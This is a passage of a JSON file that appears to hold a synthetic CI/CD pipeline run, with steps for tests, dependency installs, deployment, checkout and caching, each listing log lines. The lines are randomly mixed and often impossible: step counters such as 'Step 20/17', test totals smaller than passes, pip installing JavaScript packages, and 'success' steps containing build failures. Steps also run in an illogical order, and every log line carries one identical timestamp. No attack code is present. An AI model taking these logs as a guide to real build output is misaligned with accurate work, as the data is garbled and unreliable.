          "\u2713 Task completed in 2286ms",
          "Step 8/24: Installing dependencies",
          "Artifact downloaded: 8MB",
          "Step 16/21: Building",
          "Installing react@4.3.0",
          "Step 6/22: Building",
          "Transforming 907 files...",
          "POST /data - 202 (166ms)",
          "Coverage: 97% statements, 88% branches",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Step 20/17: Running migrations",
          "NODE_ENV=test",
          "WARNING: lodash has known vulnerabilities",
          "Ran 183 tests in 35s",
          "Time: 78.942s",
          "Layer 9/8: RUN command",
          "Bundling vendor.js",
          "[12:20:10] INFO: Cache refreshed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 2/16: Building",
          "Coverage: 72% statements, 92% branches",
          "TLS handshake completed",
          "Transforming 668 files...",
          "Test Suites: 14 passed, 49 total",
          "Cache restored successfully (212MB)",
          "[12:20:10] INFO: Connecting to database",
          "Finished.",
          "yarn add: Done in 14.39s",
          "Creating production build...",
          "Switched to branch 'feature/task-504'",
          "GET /api - 201 (69ms)",
          "Using Python 3.10",
          "[12:20:10] ERROR: Connection failed",
          "POST /data - 201 (232ms)",
          "Fetching submodules...",
          "Connection established",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "WARNING: express has known vulnerabilities",
          "Installing axios@2.13.8",
          "Creating production build...",
          "[12:20:10] INFO: Connecting to database",
          "Success!",
          "  PASS: test_user_create (294ms)",
          "[12:20:10] ERROR: Connection failed",
          "Step 8/15: Linting",
          "TLS handshake completed",
          "pip: Installing build dependencies...",
          "Compiling components/app.ts...",
          "pip: Downloading axios-1.10.tar.gz",
          "Platform: darwin-arm64",
          "npm install: resolved 500 packages",
          "[12:20:10] INFO: Processing request",
          "Bundling main.css",
          "Connection established",
          "Bundling vendor.js",
          "Step 2/23: Running migrations",
          "  PASS: test_auth_login (118ms)",
          "Fetching submodules...",
          "[12:20:10] WARN: Deprecated API usage",
          "Step 8/16: Linting",
          "Already up to date.",
          "Compiling utils/index.js...",
          "[12:20:10] DEBUG: Connection pool: 15 active",
          "[12:20:10] INFO: Cache refreshed",
          "TLS handshake completed",
          "npm notice: created a lockfile",
          "Compiling components/index.js...",
          "TLS handshake completed",
          "Already up to date.",
          "Uploading artifact 'dist' (17 files)",
          "[12:20:10] INFO: Processing request",
          "Tests: 438 passed, 156 total",
          "TLS handshake completed",
          "Connecting to test.io:443...",
          "npm install: added 176 packages",
          "Layer 2/8: ENV command",
          "Already up to date.",
          "[12:20:10] WARN: Deprecated API usage",
          "Fetching submodules...",
          "[12:20:10] DEBUG: Connection pool: 8 active",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-27T12:21:42.084537",
        "finished_at": "2025-11-27T12:22:00.334923",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Artifact downloaded: 19MB",
          "Cache hit for key-6628",
          "[12:20:10] DEBUG: Initializing service",
          "OK",
          "Pushing to registry...",
          "Building Docker image...",
          "Compiling lib/utils.go...",
          "Processing...",
          "[12:20:10] WARN: Deprecated API usage",
          "Done.",
          "Test Suites: 30 passed, 43 total",
          "pip install: Successfully installed webpack-3.2",
          "Compiling utils/service.java...",
          "Bundling styles.js",
          "Image pulled successfully",
          "Checking out develop branch",
          "Ran 129 tests in 51s",
          "Optimizing 45 modules...",
          "Image pulled successfully",
          "Compiling lib/index.js...",
          "Minifying main.js",
          "[12:20:10] WARN: Deprecated API usage",
          "Step 4/24: Installing dependencies",
          "Compiling components/index.js...",
          "Compiling components/main.py...",
          "Minifying vendor.js",
          "Platform: darwin-arm64",
          "yarn add: Done in 15.85s",
          "[12:20:10] ERROR: Connection failed",
          "Using Python 3.9",
          "Uploading artifact 'coverage' (8 files)",
          "Minifying main.js",
          "Ready.",
          "Cache invalidated: dependencies",
          "Layer 7/10: ENV command",
          "\u2713 All checks passed",
          "GET /api - 201 (50ms)",
          "Finished.",
          "Cache saved successfully",
          "[12:20:10] INFO: Cache refreshed",
          "Creating production build...",
          "Cache hit for key-2006",
          "Cache saved successfully",
          "  PASS: integration/test_auth_login.spec.js",
          "Pushing to registry...",
          "Fetching submodules...",
          "Coverage: 98% statements, 83% branches",
          "[12:20:10] INFO: Processing request",
          "Connection established",
          "Step 8/19: Installing dependencies",
          "Compiling utils/app.ts...",
          "Artifact uploaded: dist.zip (53MB)",
          "pip install: Successfully installed axios-4.10",
          "[12:20:10] ERROR: Connection failed",
          "Done.",
          "Uploading artifact 'coverage' (10 files)",
          "Verifying...",
          "Tests: 428 passed, 252 total",
          "Installing react@1.9.0",
          "npm notice: package.json updated",
          "Cache restored successfully (360MB)",
          "Compiling components/service.java...",
          "npm install: resolved 424 packages",
          "Compiling src/handler.rs...",
          "Ready.",
          "npm notice: created a lockfile",
          "[12:20:10] INFO: Starting build process",
          "pip install: Successfully installed eslint-5.18",
          "Step 2/25: Deploying",
          "Using Node.js 15.8.1",
          "\u2717 build failed with exit code 94",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm notice: package.json updated",
          "Cache hit for key-4653",
          "  PASS: test_api_health (27ms)",
          "[12:20:10] DEBUG: Initializing service",
          "[12:20:10] INFO: Connecting to database",
          "Step 20/16: Testing",
          "Creating production build...",
          "npm install: resolved 866 packages",
          "[12:20:10] INFO: Request completed",
          "Step 20/15: Running migrations",
          "GET /health - 204 (30ms)",
          "Artifact uploaded: dist.zip (76MB)",
          "Cache hit for key-3965",
          "Installing axios@3.14.3",
          "pip: Collecting axios",
          "\u2713 Step 'build' succeeded",
          "Tests: 276 passed, 171 total",
          "Cache miss for key-1427",
          "Step 6/16: Installing dependencies",
          "Exception: TypeError",
          "Compiling lib/main.py...",
          "[12:20:10] DEBUG: Initializing service",
          "Step 3/25: Building",
          "Step 18/21: Building",
          "TLS handshake completed",
          "Bundling main.js",
          "Creating production build...",
          "Connection established",
          "\u2713 Step 'checkout' succeeded",
          "\u2713 deploy completed",
          "npm install: resolved 1350 packages",
          "Optimizing 79 modules...",
          "WARNING: eslint has known vulnerabilities",
          "Completed.",
          "Artifact uploaded: dist.zip (11MB)",
          "npm install: added 372 packages",
          "Artifact downloaded: 24MB",
          "Test Suites: 6 passed, 39 total",
          "Cache invalidated: node_modules",
          "Environment: test",
          "\u2713 lint completed",
          "pip install: Successfully installed express-1.15",
          "pip: Downloading express-1.20.tar.gz",
          "Building Docker image...",
          "Artifact uploaded: dist.zip (15MB)",
          "Tests: 94 passed, 347 total",
          "Verifying...",
          "Already up to date.",
          "Cache restored successfully (322MB)",
          "WARNING: lodash has known vulnerabilities",
          "WARNING: lodash has known vulnerabilities",
          "Compiling utils/index.js...",
          "Test Suites: 28 passed, 17 total",
          "Step 9/25: Building",
          "Using Python 3.10",
          "Processing...",
          "Connection established",
          "[12:20:10] ERROR: Connection failed",
          "Cache invalidated: build",
          "Fetching submodules...",
          "Environment: staging",
          "Snapshots: 13 passed, 5 total",
          "\u2713 package completed",
          "Bundling vendor.css",
          "Exception: RuntimeError",
          "POST /upload - 200 (489ms)",
          "Tests: 343 passed, 465 total",
          "[12:20:10] DEBUG: Memory usage: 167MB",
          "Step 8/19: Deploying",
          "Cache saved successfully",
          "WARNING: webpack has known vulnerabilities",
          "yarn add: Done in 24.22s",
          "npm install: added 123 packages",
          "Ready.",
          "npm install: added 428 packages",
          "[12:20:10] INFO: Cache refreshed",
          "Tests: 361 passed, 273 total",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-11-27T12:22:00.334923",
        "finished_at": "2025-11-27T12:22:55.086081",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Tests: 471 passed, 171 total",
          "[12:20:10] DEBUG: Connection pool: 12 active",
          "FAILED: test_auth_login",
          "pip: Collecting express",
          "Cache restored successfully (447MB)",
          "Checking out develop branch",
          "HEAD is now at 778f4f5",
          "NODE_ENV=production",
          "TLS handshake completed",
          "Compiling lib/app.ts...",
          "\u2717 build failed with exit code 82",
          "Generating source maps...",
          "Building Docker image...",
          "pip: Downloading lodash-5.17.tar.gz",
          "Transforming 614 files...",
          "Processing...",
          "Compiling components/app.ts...",
          "Connecting to example.com:443...",
          "Compiling src/main.py...",
          "Ready.",
          "[12:20:10] DEBUG: Connection pool: 19 active",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Using Python 3.9",
          "POST /upload - 200 (285ms)",
          "Artifact uploaded: dist.zip (28MB)",
          "Checking out master branch",
          "pip: Installing build dependencies...",
          "[12:20:10] DEBUG: Memory usage: 100MB",
          "pip: Installing build dependencies...",
          "Cache invalidated: build",
          "Bundling styles.js",
          "Success!",
          "[12:20:10] DEBUG: Loading configuration",
          "Step 9/16: Testing",
          "[12:20:10] DEBUG: Connection pool: 3 active",
          "Bundling runtime.css",
          "[12:20:10] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Step 4/24: Linting",
          "Step 2/22: Testing",
          "pip install: Successfully installed axios-2.4",
          "npm install: added 254 packages",
          "Time: 22.184s",
          "[12:20:10] DEBUG: Loading configuration",
          "Optimizing 73 modules...",
          "pip: Collecting jest",
          "Building Docker image...",
          "npm notice: package.json updated",
          "NODE_ENV=test",
          "[12:20:10] INFO: Cache refreshed",
          "Checking out develop branch",
          "[12:20:10] WARN: Deprecated API usage",
          "Success!",
          "Generating source maps...",
          "Cache hit for key-1253",
          "\u2717 build failed with exit code 68",
          "Success!",
          "Creating production build...",
          "[12:20:10] INFO: Starting build process",
          "Verifying...",
          "pip: Downloading prettier-2.15.tar.gz",
          "npm install: added 34 packages",
          "Already up to date.",
          "WARNING: webpack has known vulnerabilities",
          "Cache saved successfully",
          "Image pulled successfully",
          "Pushing to registry...",
          "Fetching submodules...",
          "Image pulled successfully",
          "Already up to date.",
          "Generating source maps...",
          "Cache hit for key-3251",
          "[12:20:10] INFO: Cache refreshed",
          "\u2713 Step 'setup' succeeded",
          "pip: Installing build dependencies...",
          "[12:20:10] INFO: Processing request",
          "Using Node.js 16.7.10",
          "Fetching submodules...",
          "WARNING: eslint has known vulnerabilities",
          "Platform: linux-x64",
          "GET /api - 204 (89ms)",
          "Step 12/22: Running migrations",
          "[12:20:10] INFO: Processing request",
          "Cache restored successfully (50MB)",
          "[12:20:10] INFO: Processing request",
          "pip: Collecting lodash",
          "Step 4/19: Deploying",
          "[12:20:10] WARN: Deprecated API usage",
          "Cache invalidated: node_modules",
          "[12:20:10] WARN: Deprecated API usage",
          "[12:20:10] DEBUG: Connection pool: 14 active",
          "Step 19/22: Installing dependencies",
          "Step 20/17: Installing dependencies",
          "Pulling image: node:18",
          "Creating production build...",
          "pip: Collecting jest",
          "Step 13/24: Running migrations",
          "Connecting to example.com:443...",
          "Optimizing 18 modules...",
          "WARNING: express has known vulnerabilities",
          "Pushing to registry...",
          "Compiling components/app.ts...",
          "Optimizing 75 modules...",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Step 10/15: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_api_health (473ms)",
          "npm install: added 43 packages",
          "Environment: test",
          "Uploading artifact 'dist' (31 files)",
          "Step 18/22: Testing",
          "[12:20:10] WARN: Deprecated API usage",
          "  PASS: integration/test_auth_login.spec.js",
          "Step 14/25: Deploying",
          "\u2713 All checks passed",
          "[12:20:10] INFO: Processing request",
          "Generating source maps...",
          "Cache restored successfully (243MB)",
          "Finished.",
          "[12:20:10] INFO: Cache refreshed",
          "Tests: 79 passed, 275 total",
          "pip install: Successfully installed express-4.9",
          "Using Python 3.11",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "yarn add: Done in 25.19s",
          "Pulling image: python:18",
          "Ran 24 tests in 53s",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Environment: production",
          "npm install: resolved 1177 packages",
          "Snapshots: 14 passed, 46 total",
          "Compiling components/service.java...",
          "Artifact uploaded: dist.zip (47MB)",
          "Test Suites: 49 passed, 6 total",
          "HEAD is now at dc5bfeb",
          "Artifact uploaded: dist.zip (40MB)",
          "  PASS: test_cache_hit (253ms)",
          "Building Docker image...",
          "Connecting to test.io:443...",
          "Using Python 3.12",
          "Step 17/17: Installing dependencies",
          "[12:20:10] INFO: Cache refreshed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "POST /api - 201 (448ms)",
          "Layer 6/9: COPY command",
          "Success!",
          "Exception: NullPointerException",
          "Step 2/23: Linting",
          "Already up to date.",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-27T12:22:55.086081",
        "finished_at": "2025-11-27T12:23:13.336467",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Already up to date.",
          "Already up to date.",
          "pip install: Successfully installed eslint-3.9",
          "  PASS: integration/test_api_health.spec.js",
          "Finished.",
          "Ready.",
          "Snapshots: 2 passed, 9 total",
          "[12:20:10] INFO: Starting build process",
          "POST /data - 201 (68ms)",
          "[12:20:10] DEBUG: Loading configuration",
          "Tests: 196 passed, 318 total",
          "\u2713 Step 'setup' succeeded",
          "Step 12/20: Deploying",
          "Step 1/16: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:20:10] DEBUG: Memory usage: 1219MB",
          "Building Docker image...",
          "Tests: 161 passed, 156 total",
          "Connection established",
          "NODE_ENV=development",
          "Creating production build...",
          "Connection established",
          "Installing axios@1.10.5",
          "Processing...",
          "TLS handshake completed",
          "Compiling lib/main.py...",
          "Switched to branch 'feature/task-709'",
          "GET /status - 200 (7ms)",
          "Already up to date.",
          "Connecting to example.com:443...",
          "HEAD is now at 660d82f",
          "Uploading artifact 'dist' (40 files)",
          "pip: Downloading react-2.2.tar.gz",
          "  PASS: e2e/test_api_health.spec.js",
          "FAILED: test_db_connect",
          "Platform: win32-x64",
          "Using Python 3.9",
          "\u2717 build failed with exit code 72",
          "Switched to branch 'hotfix/task-734'",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Step 19/15: Linting",
          "Uploading artifact 'dist' (40 files)",
          "Connection established",
          "FAILED: test_auth_login",
          "Generating source maps...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache invalidated: build",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Checking out master branch",
          "npm install: resolved 749 packages",
          "Step 4/21: Deploying",
          "FAILED: test_cache_hit",
          "Minifying vendor.js",
          "HEAD is now at f3d449c",
          "WARNING: react has known vulnerabilities",
          "FAILED: test_api_health",
          "[12:20:10] ERROR: Connection failed",
          "Step 17/24: Running migrations",
          "WARNING: lodash has known vulnerabilities",
          "npm notice: package.json updated",
          "Checking out develop branch",
          "TLS handshake completed",
          "GET /api - 204 (99ms)",
          "Environment: production",
          "[12:20:10] WARN: Deprecated API usage",
          "Step 7/17: Deploying",
          "Snapshots: 49 passed, 18 total",
          "npm install: added 379 packages",
          "Connecting to test.io:443...",
          "POST /api - 201 (475ms)",
          "Step 15/18: Testing",
          "yarn add: Done in 6.11s",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Ran 184 tests in 15s",
          "Uploading artifact 'coverage' (7 files)",
          "Step 17/20: Building",
          "[12:20:10] ERROR: Connection failed",
          "npm install: added 121 packages",
          "Connection established",
          "Artifact uploaded: dist.zip (22MB)",
          "Already up to date.",
          "Tests: 388 passed, 490 total",
          "npm install: added 289 packages",
          "Compiling components/main.py...",
          "WARNING: axios has known vulnerabilities",
          "Artifact downloaded: 38MB",
          "Generating source maps...",
          "WARNING: express has known vulnerabilities",
          "Installing lodash@2.17.2",
          "Done.",
          "Artifact uploaded: dist.zip (56MB)",
          "Exception: NullPointerException",
          "Step 5/17: Installing dependencies",
          "Verifying...",
          "Cache restored successfully (323MB)",
          "Cache hit for key-7668",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "yarn add: Done in 18.65s",
          "Completed.",
          "npm notice: created a lockfile",
          "Ready.",
          "WARNING: react has known vulnerabilities",
          "Transforming 774 files...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Minifying main.js",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache invalidated: build",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "pip: Collecting react",
          "[12:20:10] ERROR: Connection failed",
          "Already up to date.",
          "[12:20:10] DEBUG: Initializing service",
          "[12:20:10] DEBUG: Memory usage: 740MB",
          "Pushing to registry...",
          "pip install: Successfully installed react-2.6",
          "Snapshots: 42 passed, 44 total",
          "Optimizing 49 modules...",
          "Pulling image: alpine:latest",
          "Building Docker image...",
          "Compiling utils/main.py...",
          "\u2713 All checks passed",
          "Pushing to registry...",
          "[12:20:10] WARN: Deprecated API usage",
          "[12:20:10] DEBUG: Memory usage: 1887MB",
          "Step 12/16: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:20:10] DEBUG: Loading configuration",
          "Already up to date.",
          "[12:20:10] DEBUG: Memory usage: 124MB",
          "[12:20:10] INFO: Starting build process",
          "npm notice: created a lockfile",
          "FAILED: test_api_health",
          "Snapshots: 29 passed, 2 total",
          "Using Python 3.12",
          "Artifact downloaded: 49MB",
          "\u2713 Step 'test' succeeded",
          "Step 13/19: Linting",
          "Tests: 416 passed, 58 total",
          "\u2713 Step 'checkout' succeeded",
          "Using Node.js 16.5.7",
          "Step 5/21: Installing dependencies",
          "Step 18/15: Running migrations",
          "Artifact downloaded: 36MB",
          "Step 19/17: Running migrations",
          "[12:20:10] INFO: Request completed",
          "Waiting...",
          "[12:20:10] DEBUG: Initializing service",
          "Compiling lib/app.ts...",
          "Tests: 361 passed, 247 total",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-27T12:23:13.336467",
        "finished_at": "2025-11-27T12:23:20.636621",
        "log_lines": [
          "=== Step: checkout ===",
          "[12:20:10] WARN: Deprecated API usage",
          "OK",
          "yarn add: Done in 19.14s",
          "\u2713 build completed",
          "Connection established",
          "Done.",
          "[12:20:10] INFO: Starting build process",
          "Test Suites: 19 passed, 45 total",
          "Platform: darwin-arm64",
          "Transforming 182 files...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/index.js...",
          "pip: Installing build dependencies...",
          "OK",
          "npm install: added 42 packages",
          "Ran 68 tests in 6s",
          "[12:20:10] DEBUG: Loading configuration",
          "pip: Installing build dependencies...",
          "[12:20:10] INFO: Starting build process",
          "  PASS: unit/test_api_health.spec.js",
          "Using Python 3.11",
          "Step 9/21: Testing",
          "Using Python 3.11",
          "Using Node.js 18.7.7",
          "FAILED: test_db_connect",
          "Connection established",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling lib/service.java...",
          "[12:20:10] INFO: Cache refreshed",
          "Success!",
          "Image pulled successfully",
          "Step 3/24: Running migrations",
          "\u2713 All checks passed",
          "[12:20:10] INFO: Processing request",
          "Step 5/15: Building",
          "yarn add: Done in 28.30s",
          "Compiling src/handler.rs...",
          "Test Suites: 10 passed, 25 total",
          "Ran 27 tests in 22s",
          "\u2713 lint completed",
          "Building Docker image...",
          "[12:20:10] DEBUG: Connection pool: 20 active",
          "Optimizing 13 modules...",
          "Step 16/18: Building",
          "[12:20:10] WARN: Deprecated API usage",
          "Compiling utils/utils.go...",
          "GET /health - 200 (70ms)",
          "POST /data - 201 (167ms)",
          "pip install: Successfully installed axios-3.5",
          "[12:20:10] INFO: Cache refreshed",
          "pip install: Successfully installed prettier-2.11",
          "Cache restored successfully (148MB)",
          "Using Node.js 19.8.4",
          "[12:20:10] DEBUG: Connection pool: 17 active",
          "Cache miss for key-9509",
          "\u2713 Step 'test' succeeded",
          "[12:20:10] INFO: Cache refreshed",
          "Completed.",
          "Compiling lib/utils.go...",
          "Creating production build...",
          "pip: Collecting webpack",
          "Loading...",
          "Done.",
          "Success!",
          "Platform: linux-x64",
          "Switched to branch 'bugfix/task-202'",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Snapshots: 41 passed, 7 total",
          "Waiting...",
          "GET /status - 201 (71ms)",
          "Using Python 3.12",
          "Loading...",
          "[12:20:10] INFO: Starting build process",
          "OK",
          "pip: Collecting lodash",
          "[12:20:10] DEBUG: Memory usage: 1659MB",
          "Layer 3/10: RUN command",
          "Loading...",
          "Cache hit for key-9983",
          "Generating source maps...",
          "[12:20:10] DEBUG: Memory usage: 569MB",
          "Compiling src/main.py...",
          "[12:20:10] WARN: Deprecated API usage",
          "Cache miss for key-9081",
          "Connection established",
          "Compiling utils/service.java...",
          "Platform: win32-x64",
          "Pulling image: python:3.11",
          "[12:20:10] DEBUG: Loading configuration",
          "[12:20:10] DEBUG: Loading configuration",
          "  PASS: e2e/test_db_connect.spec.js",
          "Step 10/19: Linting",
          "Pushing to registry...",
          "GET /health - 200 (91ms)",
          "Layer 5/8: ENV command",
          "Coverage: 82% statements, 66% branches",
          "[12:20:10] INFO: Connecting to database",
          "  PASS: integration/test_api_health.spec.js",
          "[12:20:10] INFO: Cache refreshed",
          "Step 3/25: Running migrations",
          "Environment: test",
          "Ready.",
          "pip: Installing build dependencies...",
          "Bundling vendor.css",
          "\u2713 validate completed",
          "Loading...",
          "GET /status - 204 (77ms)",
          "  PASS: unit/test_user_create.spec.js",
          "Waiting...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:20:10] INFO: Starting build process",
          "[12:20:10] INFO: Starting build process",
          "  PASS: unit/test_db_connect.spec.js",
          "Compiling lib/utils.go...",
          "[12:20:10] DEBUG: Loading configuration",
          "Finished.",
          "Uploading artifact 'build' (5 files)",
          "Tests: 62 passed, 191 total",
          "Tests: 487 passed, 167 total",
          "Creating production build...",
          "Pushing to registry...",
          "Pushing to registry...",
          "Step 18/22: Installing dependencies",
          "Artifact uploaded: build.tar.gz (31MB)",
          "POST /upload - 200 (79ms)",
          "Pushing to registry...",
          "Layer 8/13: ENV command",
          "pip install: Successfully installed react-4.19",
          "Ready.",
          "Compiling components/index.js...",
          "Cache restored successfully (416MB)",
          "Waiting...",
          "Success!",
          "WARNING: eslint has known vulnerabilities",
          "Compiling utils/index.js...",
          "[12:20:10] DEBUG: Connection pool: 5 active",
          "[12:20:10] INFO: Starting build process",
          "NODE_ENV=test",
          "Creating production build...",
          "Connection established",
          "pip: Collecting eslint",
          "\u2713 deploy completed",
          "Ran 116 tests in 28s",
          "Connection established",
          "Waiting...",
          "Creating production build...",
          "pip: Collecting jest",
          "Verifying...",
          "Ready.",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-27T12:23:20.636621",
        "finished_at": "2025-11-27T12:23:31.586853",
        "log_lines": [
          "=== Step: save_cache ===",
          "GET /api - 201 (94ms)",
          "Image pulled successfully",
          "Waiting...",
          "Compiling components/handler.rs...",
          "Cache saved successfully",
          "Waiting...",
          "Uploading artifact 'dist' (38 files)",
          "Verifying...",
          "Ran 195 tests in 54s",
          "OK",
          "pip: Collecting react",
          "Tests: 350 passed, 431 total",
          "[12:20:10] INFO: Connecting to database",
          "Transforming 542 files...",
          "Compiling lib/index.js...",
          "pip: Downloading react-5.0.tar.gz",
          "Compiling utils/service.java...",
          "Compiling components/main.py...",
          "\u2713 validate completed",
          "Pushing to registry...",
          "WARNING: eslint has known vulnerabilities",
          "Pulling image: node:latest",
          "npm install: added 27 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "yarn add: Done in 14.22s",
          "Checking out develop branch",
          "Connection established",
          "Coverage: 70% statements, 98% branches",
          "  PASS: test_db_connect (349ms)",
          "Cache invalidated: dependencies",
          "Finished.",
          "Minifying vendor.js",
          "[12:20:10] INFO: Starting build process",
          "pip install: Successfully installed lodash-1.18",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Layer 7/11: COPY command",
          "Bundling runtime.js",
          "\u2717 build failed with exit code 41",
          "POST /upload - 200 (441ms)",
          "Using Python 3.11",
          "Using Node.js 20.16.7",
          "Cache saved successfully",
          "Done.",
          "Test Suites: 32 passed, 27 total",
          "Transforming 544 files...",
          "[12:20:10] DEBUG: Loading configuration",
          "Generating source maps...",
          "[12:20:10] WARN: Deprecated API usage",
          "Loading...",
          "Bundling main.js",
          "Step 18/20: Running migrations",
          "Building Docker image...",
          "NODE_ENV=production",
          "WARNING: react has known vulnerabilities",
          "\u2713 All checks passed",
          "Bundling runtime.css",
          "\u2713 Task completed in 4188ms",
          "Compiling components/main.py...",
          "  PASS: test_auth_login (365ms)",
          "yarn add: Done in 3.85s",
          "[12:20:10] INFO: Cache refreshed",
          "Generating source maps...",
          "Finished.",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Snapshots: 3 passed, 37 total",
          "Already up to date.",
          "Cache invalidated: dependencies",
          "Ran 15 tests in 58s",
          "Ran 111 tests in 27s",
          "\u2717 build failed with exit code 30",
          "Minifying vendor.js",
          "Success!",
          "WARNING: lodash has known vulnerabilities",
          "Platform: win32-x64",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:20:10] INFO: Connecting to database",
          "Completed.",
          "Step 2/24: Linting",
          "Artifact downloaded: 6MB",
          "Completed.",
          "pip install: Successfully installed eslint-5.20",
          "Minifying vendor.js",
          "Step 7/17: Deploying",
          "TLS handshake completed",
          "Ran 150 tests in 57s",
          "HEAD is now at 3924ef5",
          "\u2713 All checks passed",
          "Generating source maps...",
          "Cache saved successfully",
          "Processing...",
          "WARNING: express has known vulnerabilities",
          "Snapshots: 48 passed, 16 total",
          "[12:20:10] INFO: Request completed",
          "Waiting...",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Artifact downloaded: 49MB",
          "POST /data - 201 (160ms)",
          "Bundling styles.css",
          "OK",
          "Time: 66.840s",
          "pip: Downloading prettier-2.0.tar.gz",
          "Checking out develop branch",
          "Success!",
          "Switched to branch 'hotfix/task-532'",
          "yarn add: Done in 23.8s",
          "HEAD is now at 9676a63",
          "Compiling components/service.java...",
          "  PASS: test_user_create (280ms)",
          "Compiling utils/main.py...",
          "FAILED: test_db_connect",
          "npm install: resolved 1405 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Bundling vendor.js",
          "Compiling src/handler.rs...",
          "npm notice: package.json updated",
          "[12:20:10] INFO: Cache refreshed",
          "pip: Downloading express-3.5.tar.gz",
          "Switched to branch 'bugfix/task-655'",
          "[12:20:10] INFO: Processing request",
          "[12:20:10] INFO: Processing request",
          "Coverage: 77% statements, 60% branches",
          "\u2713 Task completed in 2802ms",
          "[12:20:10] INFO: Processing request",
          "Artifact uploaded: dist.zip (87MB)",
          "HEAD is now at fda284b",
          "Test Suites: 19 passed, 15 total",
          "npm install: added 129 packages",
          "Ready.",
          "[12:20:10] INFO: Request completed",
          "OK",
          "Tests: 116 passed, 218 total",
          "  PASS: test_user_create (83ms)",
          "WARNING: prettier has known vulnerabilities",
          "Waiting...",
          "OK",
          "Done.",
          "\u2713 Step 'test' succeeded",
          "Environment: development",
          "[12:20:10] INFO: Starting build process",
          "Success!",
          "Platform: win32-x64",
          "[12:20:10] DEBUG: Loading configuration",
          "pip: Downloading lodash-3.3.tar.gz",
          "[12:20:10] INFO: Starting build process",
          "Completed.",
          "\u2713 test completed",
          "  PASS: integration/test_cache_hit.spec.js",
          "Step 20/15: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-27T12:23:31.586853",
        "finished_at": "2025-11-27T12:23:38.887007",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Waiting...",
          "Compiling utils/main.py...",
          "pip install: Successfully installed express-5.6",
          "[12:20:10] INFO: Starting build process",
          "Uploading artifact 'build' (48 files)",
          "Environment: development",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Using Node.js 16.9.6",
          "Image pulled successfully",
          "Done.",
          "Fetching submodules...",
          "Cache invalidated: node_modules",
          "[12:20:10] DEBUG: Query executed in 72ms",
          "Checking out develop branch",
          "Ready.",
          "WARNING: prettier has known vulnerabilities",
          "Step 17/18: Deploying",
          "TLS handshake completed",
          "Environment: test",
          "Connecting to cloud.services:443...",
          "Tests: 464 passed, 290 total",
          "Processing...",
          "Finished.",
          "Step 11/15: Building",
          "Ready.",
          "Compiling lib/main.py...",
          "npm install: resolved 548 packages",
          "  PASS: integration/test_user_create.spec.js",
          "Using Python 3.10",
          "Pushing to registry...",
          "Ready.",
          "Transforming 746 files...",
          "Cache miss for key-1603",
          "Waiting...",
          "Compiling components/app.ts...",
          "Ready.",
          "Artifact uploaded: dist.zip (10MB)",
          "Uploading artifact 'coverage' (5 files)",
          "Bundling runtime.css",
          "Minifying vendor.js",
          "\u2713 deploy completed",
          "Switched to branch 'feature/task-705'",
          "Loading...",
          "[12:20:10] DEBUG: Loading configuration",
          "\u2713 Task completed in 2250ms",
          "Artifact downloaded: 33MB",
          "Compiling utils/handler.rs...",
          "NODE_ENV=development",
          "Building Docker image...",
          "Connecting to test.io:443...",
          "Creating production build...",
          "Exception: ValueError",
          "Coverage: 96% statements, 80% branches",
          "Cache hit for key-5382",
          "[12:20:10] DEBUG: Loading configuration",
          "\u2713 Step 'build' succeeded",
          "\u2713 deploy completed",
          "GET /status - 204 (45ms)",
          "Transforming 315 files...",
          "npm notice: created a lockfile",
          "[12:20:10] DEBUG: Connection pool: 2 active",
          "[12:20:10] INFO: Request completed",
          "[12:20:10] WARN: Deprecated API usage",
          "[12:20:10] INFO: Request completed",
          "Platform: linux-x64",
